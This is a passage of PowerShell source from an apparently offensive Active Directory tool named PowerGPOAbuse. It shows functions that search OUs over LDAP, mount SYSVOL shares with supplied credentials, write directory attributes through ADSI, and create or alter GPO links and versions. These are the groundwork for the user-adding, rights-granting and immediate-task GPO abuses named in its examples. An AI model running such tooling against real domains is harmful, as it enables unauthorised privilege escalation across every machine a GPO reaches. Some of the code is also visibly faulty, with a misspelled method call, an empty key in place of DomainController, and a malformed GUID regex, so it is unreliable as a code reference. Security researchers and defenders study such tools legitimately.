    .PARAMETER Properties

        Specific(s) property(ies) to return.

    .PARAMETER GPLink

        Search an OU with a specific GPLink.

    .PARAMETER LDAPFilter

        Additional LDAP filter to use in the research.

    .PARAMETER Raw

        Returns raw object from research.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Get-DomainOU -OUIdentity 'SecureUsers' -Domain contoso.com -Credential $cred
    
    .EXAMPLE

        Get-DomainOU -OUIdentity 'SecureUsers' -Domain contoso.com

    .EXAMPLE

        Get-DomainOU -OUIdentity 'SecureUsers'

#>

    [OutputType([System.Object[]], [System.DirectoryServices.SearchResult], [System.Management.Automation.PSCustomObject])]
    [OutputType('PowerGPOAbuse.OU')]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity")]
        [String]
        $OUIdentity,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GPLink,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Filter")]
        [String]
        $LDAPFilter,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$false)]
        [Switch]
        $Raw,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $finalFilter = ""

        if ($PSBoundParameters["LDAPFilter"]) {

            if ($LDAPFilter.Contains("(") -and $LDAPFilter.Contains(")")) {

                $finalFilter += $LDAPFilter
            } else {

                Write-Verbose "[Get-DomainOU] Wrong LDAP filter provided"
            }
        }

        if ($PSBoundParameters["GPLink"]) {

            $finalFilter += "(gplink=*$GPLink*)"
        }
    }

    PROCESS {

        if ($PSBoundParameters["OUIdentity"]) {

            if (($OUIdentity -split "-").Count -eq 5) {

                $Filter = "(&(objectClass=OrganizationalUnit)(objectGuid=$(ConvertTo-LDAPGuid -GUID $OUIdentity))$finalFilter)"
            } elseif ($OUIdentity.Contains("LDAP://")) {

                $Filter = "(&(objectClass=OrganizationalUnit)(distinguishedName=$($OUIdentity.Replace("LDAP://", '')))$finalFilter)"
            } elseif ($OUIdentity.Contains(",") -and $OUIdentity.Contais("DC=")) {

                $Filter = "(&(objectClass=OrganizationalUnit)(distinguishedName=$OUIdentity)$finalFilter)"
            } else {

                $Filter = "(&(objectClass=OrganizationalUnit)(|(name=$OUIdentity)(ou=$OUIdentity))$finalFilter)"
            }
        } else {

            $Filter = "(&(objectClass=OrganizationalUnit)$finalFilter)"
        }

        Write-Verbose "[Get-DomainOU] LDAP filter: $Filter"

        $results = Invoke-DomainSearcher @arguments -Filter $Filter

        if (-not $Raw.IsPresent) {

            $ous = @()

            foreach ($result in $results) {
            
                $psObject = New-Object System.Management.Automation.PSObject -Property @{

                    "usnchanged" = $result.Properties.usnchanged -as [System.String];
                    "distinguishedname" = $result.Properties.distinguishedname -as [System.String];
                    "whencreated" = $result.Properties.whencreated -as [System.String];
                    "instancetype" = $result.Properties.instancetype -as [System.String];
                    "usncreated" = $result.Properties.usncreated -as [System.String];
                    "dscorepropagationdata" = $result.Properties.dscorepropagationdata -as [System.String];
                    "ou" = $result.Properties.ou -as [System.String];
                    "adspath" = $result.Properties.adspath -as [System.String];
                    "objectguid" = ConvertFrom-LDAPGuid -GUID $result.Properties.objectguid[0] ;
                    "objectcategory" = $result.Properties.objectcategory -as [System.String];
                    "whenchanged" = $result.Properties.whenchanged -as [System.String];
                    "objectclass" = $result.Properties.objectclass ;
                    "gplink" = $result.Properties.gplink -as [System.String];
                    "name" = $result.Properties.name -as [System.String];
                }

                $psObject.psObject.TypeNames.Insert(0, "PowerGPOAbuse.OU")
                $ous += $psObject
            }
        } else {

            if ($results.Count -gt 1) {

                Write-Warning -Message "[Get-DomainOU] More than 1 result"    
            }

            $ous = $results
        }
    }

    END {

        if ($PSBoundParameters["Properties"]) {

            return ($ous | Select-Object -Property $Properties | Format-List)
        } else {

            return $ous
        }
    }
}

function ConvertFrom-LDAPSid {

<#

    .SYNOPSIS

        ObjectSID LDAP attribute has a special format, it's why when this attribute is present it can't be easily translated.
        This function aims to convert ObjectSID format to readable. 

    .PARAMETER SID

        ObjectSID LDAP attribute value.
#>

    [OutputType([System.String])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $SID
    )
    
    PROCESS {
        
        $objectSid = New-Object System.Security.Principal.SecurityIdentifier ($SID, 0)
    }
    
    END {
        
        return $objectSid.Value
    }
}

function ConvertTo-LDAPGuid {

<#

    .SYNOPSIS

        In order to create LDAPFilter with GUID, a special format has to be applied to the GUID.
        This function return this. 

    .PARAMETER GUID

        GUID to convert to LDAP format.

    .LINK

        https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
#>    

    [OutputType([System.String])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GUID
    )
    
    BEGIN {
        
        $match = "(.{2})(.{2})(.{2})vv(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})"
        $pattern = '"\$4\$3\$2\$1\$6\$5\$8\$7\$9\$10\$11\$12\$13\$14\$15\$16?'
    }
    
    PROCESS {

        if ($GUID.Contains("{")) {

            $GUID = $GUID.Replace("{","")
        }

        if ($GUID.Contains("}")) {

            $GUID = $GUID.replace("}","")
        }
        
        $RegexReplace = [regex]::Replace($GUID.Replace("-", ""), $match, $pattern).Replace('"', "")
        $final = $RegexReplace.SubString(0, $RegexReplace.Length - 1)
    }
    
    END {
        
        return $final
    }
}

function ConvertFrom-LDAPGuid {

<#
    .SYNOPSIS

        ObjectGUID attribute in LDAP has a special format, this function aims to convert ObjectGUID to a more readable format.

    .PARAMETER GUID

        ObjectGUID attribute value.
#>

    [OutputType([System.String])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $GUID
    )
    
    PROCESS {
        
        $GUIDObject = New-Object System.Guid (, $GUID)
    }
    
    END {
        
        return (-join @("{",$GUIDObject.Guid,"}"))
    }
}

function ConvertTo-XMLString {

<#
    .SYNOPSIS

        As proposed by @Dliv3, this function convert a string that contains special caracters into XML encoded one.

    .PARAMETER String

        String to encode.
#>

    [OutputType([String])]
    [CmdletBinding()]
    
    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $String
    )
    
    PROCESS {
        
        $string = $string.Replace("&", "&amp;").Replace("'", "&apos;").Replace("\", "&quot;").Replace(">", "&gt;").Replace("<", "&lt;")
    }
    
    END {
        return $string
    }
}

function Mount-SmbShare {

<#

    .SYNOPSIS

        Mount a specified SMB share.

    .DESCRIPTION

        Depending on the arguments provided, the function will mount the SMB share by creating a PSDrive. 

    .PARAMETER Path

        SMB path to mount.

    .PARAMETER ShareName

        Set the name of the mounted share.

    .PARAMETER DomainShare

        If set, the function will add a DC name in the path.

    .PARAMETER Remove

        Remove a mounted share.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $ActiveShare = Mount-SmbShare -DomainShare -Path "\\contoso.com\NETLOGON"

#>

    [OutputType([System.String])]
    [CmdletBinding()]

    param(

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ShareName = (-join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})),

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [Switch]
        $DomainShare,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Remove,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        if ($DomainShare) {

            $arguments = @{}
            if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}
            if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}

            if ($PSBoundParameters["DomainController"]) {

                $dc = (Find-DomainController @arguments -Identity $DomainController).dnshostname
            } else {

                $dc = (Find-DomainController @arguments).dnshostname
            }
        }
    }

    PROCESS {

        if ($DomainShare) {
            
            if ($PSBoundParameters["Credential"]) {
                
                if ($Credential.GetNetworkCredential().UserName.Domain -eq "") {

                    Write-Verbose "[Mount-SmbShare] adding domainName to Credential"

                    $domainName = ($env:USERDNSDOMAIN).Split(".")
                    $newDomain = $domainName | ForEach-Object -BEGIN {$z = ""} -PROCESS {if (-not ($domainName.IndexOf($_) -eq $domainName.Count -1 ) ) {$z += -join @($_,".")} } -END {return $z.Substring(0, $z.Length - 1)}
                    Remove-Variable -Name z
                
                    $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList (-join @($newDomain, "\",$Credential.GetNetworkCredential().UserName)),$Credential.GetNetworkCredential().Password
                }
            }
            $changePath = $Path.Substring(2)
            $changePath = $changePath.Substring($changePath.IndexOf("\"))
            $finalPath = -join @("\\", $dc, $changePath)
            
            if ($PSBoundParameters["Credential"]) {
            
                $null = New-PSDrive -Name $ShareName -PSProvider FileSystem -Root $finalPath -Credential $Credential -Scope Global
            } else {

                $null = New-PSDrive -Name $ShareName -PSProvider FileSystem -Root $finalPath -Scope Global
            }
        } else {
            if ($PSBoundParameters["Credential"]) {

                $null = New-PSDrive -Name $ShareName -PSProvider FileSystem -Root $Path -Credential $Credential -Scope Global
            } else {

                $null = New-PSDrive -Name $ShareName -PSProvider FileSystem -Root $Path -Scope Global
            }
        }

        if ($PSBoundParameters["Remove"]) {

            foreach ($provider in $Remove) {

                Remove-PSDRive -Name $provider
            }
        }
    }

    END {

        if (-not $PSBoundParameters["Remove"]) {
            
            return $ShareName
        }
    }
}

function Set-DomainObjectProperty {

<#

    .SYNOPSIS

        This function change an LDAP property.

    .DESCRIPTION

        It will mount the LDAP path, an apply modification with ADSI.

    .PARAMETER Identity

        Identity of the object to modify.

    .PARAMETER InputObject

        Raw object to provide in order to avoid additionnal request.

    .PARAMETER ObjectType

        Set the object type of the object to modify.

    .PARAMETER OverWrite

        If the value of the attribute is already set, the parameter will force overwriting.

    .PARAMETER Clear

        Erase the content of a specified attribute.

    .PARAMETER SET

        Hashtable that represents the attribute and its value.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

#>

    [OutputType([System.Boolean])]
    [CmdletBinding(DefaultParameterSetName="Request")]

    param (
        
        [Parameter(ParameterSetName="Request", Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("GPOIdentity", "OUIdentity", "UserIdentity", "GroupIdentity")]
        [String]
        $Identity,

        [Parameter(ParameterSetName="Offline", Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("RawInput")]
        [System.DirectoryServices.SearchResult]
        $InputObject,

        [Parameter(ParameterSetName="Request", Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateSet("GPO", "OU", "User", "Group")]
        [Alias("TargetType")]
        [String]
        $ObjectType,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$false)]
        [Switch]
        $OverWrite = $false,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [System.Object[]]
        $Clear,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $SET,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        
        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}
    }
    
    PROCESS {
        
        if ($Identity) {
            if ($ObjectType -eq "GPO") {

                $Object = Get-DomainGPO @arguments -GPOIdentity $Identity
            } elseif ($ObjectType -eq "OU") {

                $Object = Get-DomainOU @arguments -OUIdentity $Identity
            } elseif ($ObjectType -eq "User") {

                $Object = Get-DomainUser @arguments -UserIdentity $Identity
            } else {

                $Object = Get-DomainGroup @arguments -GroupIdentity $Identity
            }
        } else {

            $Object = $PSBoundParameters.InputObject
            if (-not ($Object.psTypeNames -match "PowerGPOAbuse.*")) {

                $Object = $Object.Properties
            }
        }

        if ($PSBoundParameters["Credential"]) {

            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry -ArgumentList $Object.adspath[0],$Credential.GetNetworkCredential().UserName,$Credential.GetNetworkCredential().Password
        } else {

            $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry -ArgumentList $Object.adspath[0]
        }

        if (-not $OverWrite) {

            foreach ($property in $SET.Keys) {
                
                Write-Verbose "[Set-DomainObjectProperty] Setting '$property' for $ObjectType $($Object.cn)"
                $ADSIObject.property += $SET[$property]
            }
        } else {

            foreach ($property in $SET.Keys) {

                Write-Verbose "[Set-DomainObjectProperty] Setting '$property' for $ObjectType $($Object.cn)"
                $ADSIObject.Put($property, $SET[$property]) 
            }
        }

        if ($PSBoundParameters["Clear"]) {

            foreach ($property in $Clear) {
                
                Write-Verbose "[Set-DomainObjectProperty] Clearing '$property' for $ObjectType $($Object.cn)"

                $ADSIObject.$property.Clear()
            }
        }
    }
    
    END {
        try {

            $ADSIObject.CommitChanges()
            return $true
        } catch {

            return $false
        }
    }
}

function Set-DomainGPOStatus {

<#

    .SYNOPSIS

    .PARAMETER GPOIdentity

        Target GPO.

    .PARAMETER Status

        the GPO status to set.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        Set-DomainGPOStatus -GPOIdentity "SuperSecureGPO" -Status "AllSettingsDisabled" 

#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]

    param (
    
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateSet("AllSettingsEnabled", "UserSettingsDisabled", "ComputerSettingsDisabled", "AllSettingsDisabled")]
        [String]
        $Status,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {

        $GpoStatus = @{"AllSettingsEnabled" = 0; "UserSettingsDisabled" = 1; "ComputerSettingsDisabled" = 2; "AllSettingsDisabled" = 3}

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}
    }
    
    PROCESS {
        
        $returnValue = Set-DomainObjectProperty @arguments -GPOIdentity $GPOIdentity -SET @{"flags" = $GpoStatus[$Status]} -OverWrite -ObjectType GPO
    }
    
    END {
        
        return $returnValue
    }
}

function New-DomainGPLink {

<#

    .SYNOPSIS
        
        Create a GPLink between an OU and a GPO.

    .PARAMETER GPOIdentity

        Target GPO to link.

    .PARAMETER OUIdentity

        Target OU to link.

    .PARAMETER Status

        Status of the GPLink.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        New-DomainGPLink -GPOIdentity "SuperSecureGPO" -OUIdentity "SecureUsers" -Status "LinkEnabled"

#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("PrincipalIdentity", "Identity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("TargetIdentity")]
        [String]
        $OUIdentity,

        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateSet("LinkEnabled", "LinkDisabled", "Enforced", "NoEnforced")]
        [ValidateCount(1,2)]
        [String[]]
        $Status,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {
        
        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $statusList = @("LinkDisabled", "NoEnforced")

        $GpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity
    }
    
    PROCESS {
        
        if ($Status.Count -eq 2) {

            if ($Status[1].Contains("Link")) {

                $statusList[0] = $Status[1]
            } else {

                $statusList[1] = $Status[1]
            }
        }
        
        if ($Status[0].Contains("Link")) {

            $statusList[0] = $Status[0]
        } else {

            $statusList[1] = $Status[0]
        }

        if ($statusList[0].Contains("LinkEnabled") -and $statusList[1].Contains("NoEnforced")) {

            $GPLinkValue = "0"
        } elseif ($statusList[0].Contains("LinkEnabled") -and $statusList[1].Contains("Enforced")) {

            $GPLinkValue = "2"
        } elseif ($statusList[0].Contains("LinkDisabled") -and $statusList[1].Contains("Enforced")) {
            
            $GPLinkValue = "3"
        } else {

            $GPLinkValue = "1"
        }

        $finalString = -join @("[", $GpoObject.adspath, ";", $GPLinkValue, "]")

        $returnValue = Set-DomainObjectProperty @arguments -SET @{"gplink" = $finalString} -ObjectType "OU" -OUIdentity $OUIdentity 
    }
    
    END {
        
        return $returnValue
    }
}
function Set-DomainGPLink {

<#

    .SYNOPSIS

        Change the status of a specified GPLink

    .PARAMETER GPOIdentity

        Target GPO.

    .PARAMETER OUIdentity

        Target OU.

    .PARAMETER Status

        Status of the GPLink to set.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

#>

    [OutputType([System.Boolean])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("PrincipalIdentity", "Identity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("TargetIdentity")]
        [String]
        $OUIdentity,

        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateSet("LinkEnabled", "LinkDisabled", "Enforced", "NoEnforced")]
        [ValidateCount(1,2)]
        [String[]]
        $Status,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {
        
        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments[""] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $OUObjectRaw = Get-DomainOU @arguments -OUIdentity $OUIdentity -Raw
        $GpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity

        $OUObject = $OUObjectRaw.Properties
    }
    
    PROCESS {
    
        $GplinkValues = ($OUObject.gplink).Split("[")

        foreach ($rawValue in $GplinkValues) {

            if (-not ($rawValue -eq "")) {

                $value = $rawValue.SubString(0, $rawValue.Length - 3)
                if ($value.Contains($GpoObject.adspath)) {

                    $actualGPLinkValue = $value.SubString($value.IndexOf(";") + 1)
                    $indexValue = $GplinkValues.IndexOf($rawValue)
                }
            }
        }

        if ($actualGPLinkValue) {

            if ($Status.Count -eq 2) {

                if ($Status.Contains("LinkEnabled") -and $Status.Contains("NoEnforced")) {

                    $futureValue = "0"
                } elseif ($Status.Contains("LinkEnabled") -and $Status.Contains("Enforced")) {

                    $futureValue = "2"
                } elseif ($Status.Contains("LinkDisabled") -and $Status.Contains("Enforced")) {
                    
                    $futureValue = "3"
                } else {

                    $futureValue = "1"
                }
            } else {

                if ($actualGPLinkValue -eq 0) {

                    $translated = @("LinkEnabled","NoEnforced")
                } elseif ($actualGPLinkValue -eq 1) {

                    $translated = @("LinkDisabled","NoEnforced")
                } elseif ($actualGPLinkValue -eq 2) {

                    $translated = @("LinkEnabled","Enforced")
                } else {

                    $translated = @("LinkDisabled","Enforced")
                }
                
                if ($Status.Contains("Link")) {

                    $translated[0] = $Status
                } else {

                    $translated[1] = $Status
                }

                if ($translated[0].Contains("LinkEnabled") -and $translated[1].Contains("NoEnforced")) {

                    $futureValue = "0"
                } elseif ($translated[0].Contains("LinkEnabled") -and $translated[1].Contains("Enforced")) {

                    $futureValue = "2"
                } elseif ($translated[0].Contains("LinkDisabled") -and $translated[1].Contains("Enforced")) {
                    
                    $futureValue = "3"
                } else {

                    $futureValue = "1"
                }
            }

            $GplinkValues[$indexValue] = -join @($GpoObject.adspath, ";", $futureValue, "]")
            $futureValueString = ""

            foreach ($string in $actualGPLinkValue) {

                if (-not $string -eq "") {

                    $futureValueString = -join @($futureValueString, "[", $string)
                }
            }

            $returnValue = Set-DomainObjectProperty @arguments -OverWrite -SET @{"gplink" = $futureValueString} -RawInput $OUObjectRaw
        } else {

            $returnValue = $false
        }
    }
    
    END {
        
        return $returnValue
    }
}

function Update-GPO {

<#
    
    .SYNOPSIS
    
        This function update the GPO properties in LDAP and GPT.ini file.
    
    .DESCRIPTION
    
        GPO Input is taken from GPOIdentity or RawInput, gPCxExtensionNames is ordered
        versionNumber in GPT.ini and in LDAP is updated. All LDAP update operation is passed
        to Set-DomainObjectProperty.
    
    .PARAMETER GPOIdentity
    
        Identity of the target GPO to update, if not set DynamicParam RawInput is created
        which ask for the raw object returned by Get-DomainGPO.

    .PARAMETER InputObject

        Raw object to provide in order to avoid additionnal request.
    
    .PARAMETER GPOType 
    
        GPO Type part to update Compouter or User type.
    
    .PARAMETER CSE
    
        gPCxExtensionNames values to change on the GPO.
    
    .PARAMETER Path
    
        Physicial path of the GPO can either be domain share or mounted share.
    
    .PARAMETER Domain
    
        Set the target domain.
    
    .PARAMETER DomainController
    
        Set the target domain controller.
    
    .PARAMETER Credential
    
        PSCredential to use for connection.
    
    .EXAMPLE
    
        Update-GPO -GPOIdentity SuperSecureGPO -CSE (New-CSEValues -AddUser)
    
    .EXAMPLE 
    
        $GPO = Get-DomainGPO -GPOIdentity SuperSecureGPO
        Update-GPO -RawInput $GPO -CSE (New-CSEValues -AddRights)
    
    .EXAMPLE
    
        Update-GPO -GPOIdentity SuperSecureGPO -CSE (New-CSEValues -ImmediateTask)
    
#>
    
    [OutputType([System.Boolean])]
    [CmdletBinding(DefaultParameterSetName="Request")]
        
    param (
        
        [Parameter(ParameterSetName="Request", Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GPOIdentity,

        [Parameter(ParameterSetName="Offline", Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("RawInput")]
        [System.DirectoryServices.SearchResult]
        $InputObject,
    
        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateSet("Computer","User")]
        [Alias("Type")]
        [String]
        $GPOType,
        
        [Parameter(Mandatory=$true, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("GUID", "CSE")]
        [System.Object[]]
        $CSEGuids,
        
        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("GPOPath", "gpcfilesyspath", "PhyisicalPath")]
        [String]
        $Path,
    
        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
    
        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,
        
        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$false)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
        
    BEGIN {
            
        $arguments = @{}
    
        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}
    
        if ($GPOIdentity) {
    
            $GpoObject = Get-DomainGPO @arguments -GPOIdentity $GPOIdentity
            $actualVersionNumber = $GpoObject.versionNumber
    
            if ($GPOType -eq "Computer") {
    
                $ActualGuids = $GpoObject.gpcmachineextensionnames
                $property = "gpcmachineextensionnames"
                $futureVersionNumber = [Int]$actualVersionNumber + 1
            } else {
        
                $ActualGuids = $GpoObject.gpcuserextensionnames
                $property = "gpcuserextensionnames"
                $futureVersionNumber = [Int]$actualVersionNumber + 65536
            }
    
            if (-not $Path) {
    
                $Path = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath
            } else {
    
                if (-not $Path.Contains(":")) {
    
                    $Path = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.gpcfilesyspath
                } else {
    
                    if ($Path.Substring($Path.Length - 1) -eq "\") {
                            
                        $Path = $Path.Substring(0, $Path.Length - 2)
                    }
                }
            }
        } else {
    
            $RawGpoObject = $PSBoundParameters["InputObject"]
            if (-not ($RawGpoObject.psTypeNames[0] -eq "PowerGPOAbuse.GPO")) {$GpoObject = $RawGpoObject.Properties}
            
            $actualVersionNumber = $GpoObject.versionNumber
    
            if ($GPOType -eq "Computer") {
    
                $ActualGuids = $GpoObject.gpcmachineextensionnames

                if ($null -eq $ActualGuids) {
                    $ActualGuids = ""
                }

                $property = "gPCMachineExtensionNames"
                $futureVersionNumber = [Int]$actualVersionNumber + 1
            } else {
                
                $ActualGuids = $GpoObject.gpcuserextensionnames

                if ($null -eq $ActualGuids) {
                    $ActualGuids = ""
                }

                $property = "gPCUserExtensionNames"
                $futureVersionNumber = [Int]$actualVersionNumber + 65536
            }
    
            if (-not $Path) {
    
                $Path = Mount-SmbShare @arguments -DomainShare -Path $GpoObject.Properties.gpcfilesyspath
            } else {
    
                if (-not $Path.Contains(":")) {
    
